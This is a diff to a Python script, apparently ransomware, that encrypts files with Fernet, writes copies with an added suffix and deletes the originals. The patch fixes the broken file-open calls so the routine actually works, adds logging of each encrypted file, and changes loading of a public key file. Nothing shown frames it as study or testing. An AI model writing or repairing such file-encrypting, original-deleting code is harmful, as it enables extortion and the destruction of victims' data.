@@ -49,18 +49,19 @@ def encrypt_files(files, key):
     for file in files:
         output = f'{file}{ENCRYPTED_SUFFIX}'
         try:
-            with open(file, 'rb', encoding='utf8') as f:
+            with open(file, 'rb') as f:
                 data = f.read()
             data = fernet.encrypt(data)
-            with open(output, 'wb', encoding='utf8') as f:
+            with open(output, 'wb') as f:
                 f.write(data)
             os.remove(file)
+            print(f'Encrypted: {file} -> {output}')
             encrypted.append({
                 'in': file,
                 'out': output
             })
-        except Exception:
-            pass
+        except Exception as e:
+            print(f'Error encrypting: {file} -> {output}')
     return encrypted
 
 
@@ -102,6 +103,6 @@ if __name__ == '__main__':
     import sys
     if len(sys.argv) > 1:
         key_file = sys.argv[1]
-        with open(key_file, 'r', encoding='utf8') as f:
-            PUBLIC_KEY = bytes(f.read(), 'utf-8')
+        with open(key_file, 'rb') as f:
+            PUBLIC_KEY = f.read()
     main()
